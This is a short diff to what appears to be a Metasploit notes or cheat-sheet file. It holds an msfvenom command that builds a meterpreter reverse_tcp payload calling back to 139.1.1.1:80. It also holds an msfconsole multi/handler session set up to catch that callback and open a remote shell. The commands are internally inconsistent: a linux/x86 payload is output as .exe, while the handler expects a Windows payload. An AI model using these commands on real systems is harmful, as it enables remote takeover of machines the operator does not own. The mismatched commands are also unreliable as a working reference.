@@ -36,11 +36,14 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=139.1.1.1 LPORT=80 -f exe -o
 ```
 
 ```
-msfconsole
-set payload linux/x86/meterpreter/reverse_tcp
-set LHOST 172.1.1.1
-set LPORT 4444
-exploit
+# msfconsole
+msf6 > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+msf exploit(handler) > set LHOST 139.1.1.1
+msf exploit(handler) > set LPORT 80
+msf exploit(handler) > show options
+
+msf exploit(handler) > exploit
 
 ```
 
